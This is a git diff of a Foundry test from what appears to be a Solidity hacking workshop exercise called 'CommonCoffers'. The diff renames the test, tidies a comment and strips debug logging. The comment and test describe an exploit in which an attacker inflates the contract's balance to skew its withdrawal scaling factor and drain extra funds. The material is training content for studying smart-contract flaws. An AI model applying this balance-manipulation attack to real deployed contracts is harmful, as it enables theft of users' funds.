@@ -5,7 +5,7 @@ import "forge-std/Test.sol";
 import "forge-std/console.sol";
 import {CommonCoffers} from "../src/SolidityHackingWorkshopV8.sol";
 
-contract CounterTest is Test {
+contract Exercise9_CommonCoffers is Test {
     CommonCoffers public commonCoffers;
     Attacker public attacker;
 
@@ -17,7 +17,7 @@ contract CounterTest is Test {
     /**
      * Attacker can increase the balance of CommonCoffers
      * contract and make this equation incorrect and in favour of attacker -
-     *  uint toRemove = (scalingFactor * _amount) / address(this).balance;
+     * uint toRemove = (scalingFactor * _amount) / address(this).balance;
      * by increasing the balance the scalingfactor will decrease on each withdraw and attacker
      * can withdraw more than expected tokens
      */
@@ -40,19 +40,10 @@ contract CounterTest is Test {
         commonCoffers.deposit{value: 2 ether}(address(this));
 
         attacker.attack{value: 8 ether}(address(commonCoffers));
-        console.log(commonCoffers.scalingFactor());
-        console.log(commonCoffers.coffers(address(this)));
-        commonCoffers.withdraw(2000000000000000000);
-        console.log(commonCoffers.coffers(address(this)));
-        console.log(commonCoffers.scalingFactor());
 
         commonCoffers.withdraw(2000000000000000000);
-        console.log(commonCoffers.coffers(address(this)));
-
-        console.log(commonCoffers.scalingFactor());
 
         commonCoffers.withdraw(2000000000000000000);
-        console.log(commonCoffers.coffers(address(this)));
     }
 
     fallback() external payable {}
